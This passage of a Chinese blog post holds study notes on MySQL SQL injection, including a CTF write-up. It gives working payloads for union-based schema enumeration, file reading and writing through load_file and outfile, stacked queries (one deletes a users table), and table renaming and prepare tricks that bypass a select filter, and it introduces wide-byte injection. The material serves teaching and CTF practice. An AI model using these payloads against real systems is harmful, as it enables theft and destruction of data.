+<pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; or 1=1 order by n #   # 用order by语句来猜测表中有多少字段 若报错 则说明字段数为n-1
+</code></pre>
+<p>五.输入1’ union select 1,2 #</p>
+<pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; union select 1,2 #   # 确定显示的字段顺序(可能出现有5个字段 但是只回显2个字段的情况)
+</code></pre>
+<p>六.获取当前数据库中的情况</p>
+<pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; union select 1,databases() #    # 获取当前的数据库名
+select first_name, last_name from users where user_id = &#39;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #    # 获取当前数据库的表名 
+select first_name, last_name from users where user_id = &#39;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #       # 获取当前表中的字段名
+select first_name, last_name from users where user_id = &#39;1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #    # 查询数据
+</code></pre>
+<p>其中**group_concat()**的作用就是将多行的数据在一行进行输出 并且用”,”分开    如果限制使用group_concat()就用limit 使用方法在上面常见的sql语句中</p>
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>是一个信息数据库 保存着mysql服务器所维护的所有其他数据库的信息 比如数据库的名 数据库的表 表栏的数据类型与访问权限等 在其中 有数个只读表 它们实际上是视图 而不是基本表</p>
+<p><font color="red"><strong>schemata表</strong></font></p>
+<p>提供了当前mtsql实例中所有数据库的信息 show databases()的结果取于此表</p>
+<p><font color="red"><strong>tables表</strong></font></p>
+<p>提供了关于数据库中的表的信息 show tables from schemaname的结果取于此表</p>
+<p><font color="red"><strong>columns表</strong></font></p>
+<p>提供了表中字段的信息 show columns from schemaname.tablename的结果取于此表</p>
+<p><strong>联合查询常用套路：</strong></p>
+<p>1.orde by 猜列数(字段数)</p>
+<p>2.union select 1,2,3,…,n n为上一步猜出来的列数  </p>
+<p>3.查看哪几列回显出来了 比如有3列 其中2、3列回显了 1列没有回显 则可以输入union select database(),2,3; 用database()代替回显不出来的第一列 即可查询到数据库名</p>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>mysql服务器维护着两种变量 <strong>全局变量</strong>影响服务器的全局操作 <strong>会话变量</strong>影响具体客户端连接相关操作</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/MySQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E5%A0%86%E5%8F%A0%E6%88%AA%E5%9B%BE__2023-05-11-20-45-16.png" alt="MySQL文件操作、宽字节、堆叠截图__2023-05-11-20-45-16"></p>
+<p>可以使用show variables语句查看系统变量及其值</p>
+<p>可以使用like进行匹配和筛选</p>
+<pre><code class="mysql">show variables like &quot;a%&quot;  # 筛选以&quot;a&quot;开头的系统变量
+</code></pre>
+<h4 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h4><p>对文件读写有影响</p>
+<p>其参数是用来限制load data,select ….,outfile, load_file()等传到那个指定目录</p>
+<p>当其值为null时 表示限制mysql不允许导入&#x2F;导出 *<em>默认是null</em></p>
+<p>当其值为&#x2F;tmp&#x2F;时 表示限制mysql的导出&#x2F;导入只能发生在&#x2F;tmp&#x2F;下</p>
+<p>当其为空值时 表示不对mysql的导入&#x2F;导出作出限制</p>
+<p><strong>mysql读文件</strong></p>
+<pre><code class="mysql">select load_file(&#39;文件名&#39;);
+select convert(load_file(&quot;文件路径&quot;) using utf8);
+</code></pre>
+<p><strong>mysql写文件</strong></p>
+<pre><code class="mysql">select &quot;&lt;php phpinfo();?&gt;&quot;(字符串) into outfile &quot;路径&quot;
+select &quot;&lt;php phpinfo();?&gt;&quot;(字符串) info dumpfile &quot;路径&quot;
+</code></pre>
+<p><strong>outfile</strong>函数可以导出多行 而<strong>dumpfile</strong>只能导出一行数据</p>
+<p><strong>outfile</strong>函数在将数据写到文件里是有特殊的格式转换 而<strong>dumpfile</strong>则保持原数据格式</p>
+<p>比如原字符串中含有表示换行符的字符(0a)outfile会将其转化为\ 在输出 而dumpfile则直接输出原内容</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/MySQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E5%A0%86%E5%8F%A0%E6%88%AA%E5%9B%BE__2023-05-11-21-11-53.png" alt="MySQL文件操作、宽字节、堆叠截图__2023-05-11-21-11-53"></p>
+<p><strong>当然 这里的一切建立在secure_file_priv的值不为null的情况下  当其值为null的时候 想要进行文件读写 需要利用下面说到的堆叠注入</strong></p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>注意 通常多条语句执行时，若前条语句已返回数据 则之后的语句返回的数据通常无法返回前端页面 建议使用union联合注入 若无法使用联合注入 可考虑使用rename关键字 将想要的数据列名&#x2F;表名更改成返回数据的sql语句所定义的表&#x2F;列名(在下面强网杯的例题中有所体现)</strong></p>
+<p>使用条件 API或者数据库引擎支持多条语句同时注入 即</p>
+<pre><code class="mysql">multi_query($sql);
+</code></pre>
+<p>mysql可以执行多条语句 多条语句之间用”;”做分隔 </p>
+<p>因为分号为mysql语句的结束符 若在支持多条语句执行的情况下 可以利用此方法执行其他恶意语句 比如rname、drop、delete等 <strong>堆叠注入可以用于执行任何sql语句</strong></p>
+<p>举个例子：执行查询时。第一个语句执行信息查询，第二个语句则将表user的所有内容删除了</p>
+<pre><code class="mysql">select * from users where id=1;delect from users;
+</code></pre>
+<p><strong>以2019年强网杯随便注为例</strong></p>
+<p>**1.**在题目源码过滤了select等语句的时候 可以使用handler语句 他允许我们一行一行的浏览一个表中的数据 </p>
+<p>使用格式：</p>
+<pre><code class="mysql">handler users open as hh; #指定数据表进行载入并返回句柄
+handler hh read first; #读取指定句柄的第一行数据
+handler hh read next; #读取指定句柄的下一行数据
+handler hh close; #关闭句柄
+</code></pre>
+<p>也可以不给表指定命名为句柄 就用表名即可</p>
+<p>2.首先输入 <code>1</code>是有回显的</p>
+<p>2.输入 <code>1&#39; and 1=2#</code>发现没有回显任何信息 说明存在sql注入</p>
+<p>3.在输入<code>1‘ union select 1;</code>尝试进行联合查询 发现题目过滤掉了select update drop insert where等语句</p>
+<p>4.使用堆叠注入</p>
+<p><code>1&#39;; show tables</code>回显了当前数据库中的表的信息</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512154010134.png" alt="image-20230512154010134"></p>
+<pre><code class="mysql">1&#39;; show columns from `1919810931114514`;#
+</code></pre>
+<p>回显了1919810931114514数据库中字段的信息 发现了flag</p>
+<p>5.过滤了select 但是可以使用handler查看字段信息</p>
+<pre><code class="mysql">1&#39;; handler `1919810931114514` open;handler `1919810931114514` read first;#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512154607756.png" alt="image-20230512154607756"></p>
+<p>得到flag{4a26eacf-123d-448e-933e-0535258f3e46}</p>
+<p><strong>解法二：rename改名</strong></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512160357171.png" alt="image-20230512160357171"></p>
+<p>对于输入1的时候 回显的这部分信息 再加上用handler语句查看的words表中的第一行数据和回显的信息一致 以及查看到words中含有的字段为id和data 猜测其对应的查询语句 可能为 <code>select * from words where id=&#39;$id&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512170918760.png" alt="image-20230512170918760"></p>
+<p>即网站源代码中存在的语句是查询名为”words”的表中名为”id”的字段对应的数据</p>
+<p>所以可以将”1919810931114514”表的名字改为”words”将”flag”字段的名字改为”id” 就可以查询到”flag”字段中的信息了</p>
+<pre><code class="mysql">1&#39;;rename table `words` to `words2`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not null;#
+</code></pre>
+<p>在输入 <code>1&#39; or 1=1#</code>就可以查询到flag了</p>
+<p><strong>解法三：mysql预处理</strong></p>
+<p>原理是因为题目过滤了select关键字 所以定义一个函数 用s和elect来拼接成select 在进行使用 </p>
+<pre><code class="mysql">1&#39;;prepare st from concat(&#39;s&#39;,&#39;elect&#39;, &#39;* from `1919810931114514`&#39;);execute st;#
+</code></pre>
+<p>直接查询出flag</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>字符集</strong>，也叫字符编码 是一种将符号转换为二进制数的映射关系</p>
+<p>常见的字符集：ASCII编码：单字节编码</p>
+<p>latin1编码：单字节编码</p>
+<p>gbk编码：使用单字节和双字节编码</p>
+<p>UTF-8编码：使用一到四字节编码</p>
+<p><strong>宽字节</strong>就是两个以上的字节 <strong>宽字节注入产生的原因就是各种字符编码的不当操作 使得攻击者可以通过宽字节编码绕过sql注入防御</strong></p>
+<p>通常来说 一个gbk编码汉字 占用2字节 一个utf-8编码汉字 占用3个字节 </p>
+<pre><code class="php">echo strlen(&quot;和&quot;)
+</code></pre>
+<p>当页面保存为gbk时输出2 保存为utf-8时输出3</p>
+<p>除gbk以外 所有的ANSII编码都是两个字节</p>
+<p><strong>产生原因：</strong>程序员设置数据库编码和php编码为两个不同的编码那就有可能产生宽字节注入</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514212826314.png" alt="image-20230514212826314"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514213445033.png" alt="image-20230514213445033"></p>
+<p>转义函数会将”<strong>‘</strong>“ 单引号 用” \ “进行转义 防止其影响sql语句</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514213935175.png" alt="image-20230514213935175"></p>
+<p>使用转义函数addslashes后 将admin后面的单引号转义了 不会对执行sql语句产生影响 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230514214233897.png" alt="image-20230514214233897"></p>
+<p>但是在这里汉字字符将转义字符”吃”掉了 所以对sql语句执行产生了影响 发生宽字节注入</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/posts/bc0b1168.html">http://w3nx1z1.github.io/posts/bc0b1168.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/efef7113.html" title="LitCTF一些题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">LitCTF一些题解</div></div></a></div><div class="next-post pull-right"><a href="/posts/b4292853.html" title="第六届精武杯wp(服务器部分)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第六届精武杯wp(服务器部分)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/f5b0b099.html" title="2023年陕西省赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-03</div><div class="title">2023年陕西省赛</div></div></a></div><div><a href="/posts/b348ce4d.html" title="2023极客大挑战"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-01</div><div class="title">2023极客大挑战</div></div></a></div><div><a href="/posts/e3e525cf.html" title="2024ISG观安杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-20</div><div class="title">2024ISG观安杯</div></div></a></div><div><a href="/posts/6c995156.html" title="2024数信杯北区决赛实操"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-03</div><div class="title">2024数信杯北区决赛实操</div></div></a></div><div><a href="/posts/ab6bd6fa.html" title="2024数字中国"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-29</div><div class="title">2024数字中国</div></div></a></div><div><a href="/posts/efef7113.html" title="LitCTF一些题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">LitCTF一些题解</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E5%AE%9E%E8%AE%AD%E6%8A%80%E8%83%BD%E5%90%AC%E8%AF%BE%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD"><span class="toc-text">web实训技能听课笔记(持续更新中)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%96%B0%E6%89%8B%E6%9D%91"><span class="toc-text">web新手村</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5%E7%BB%95%E8%BF%87"><span class="toc-text">MD5绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-text">变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extract"><span class="toc-text">Extract()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parse-str"><span class="toc-text">Parse_str</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98"><span class="toc-text">随机数问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">数据库基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E5%9F%BA%E7%A1%80"><span class="toc-text">Mysql基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84sql%E8%AF%AD%E5%8F%A5"><span class="toc-text">常见的sql语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-text">information_schema</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-text">文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#secure-file-priv"><span class="toc-text">secure_file_priv</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">宽字节注入</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6f5a3cd.html" title="2025启航杯wp">2025启航杯wp</a><time datetime="2025-01-25T15:56:54.364Z" title="发表于 2025-01-25 23:56:54">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2f21d3bc.html" title="2025龙信考核比武">2025龙信考核比武</a><time datetime="2025-01-11T01:20:22.398Z" title="发表于 2025-01-11 09:20:22">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/67db48b9.html" title="2024冀信杯决赛">2024冀信杯决赛</a><time datetime="2025-01-10T16:54:11.458Z" title="发表于 2025-01-11 00:54:11">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5b3dd75d.html" title="DASCTF 2024最后一战 | Misc">DASCTF 2024最后一战 | Misc</a><time datetime="2025-01-08T10:00:09.647Z" title="发表于 2025-01-08 18:00:09">2025-01-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/90927854.html" title="w3nx1z1的2024年度个人总结">w3nx1z1的2024年度个人总结</a><time datetime="2024-12-31T12:34:30.170Z" title="发表于 2024-12-31 20:34:30">2024-12-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
+      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
+      avatar: 'monsterid',
+      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
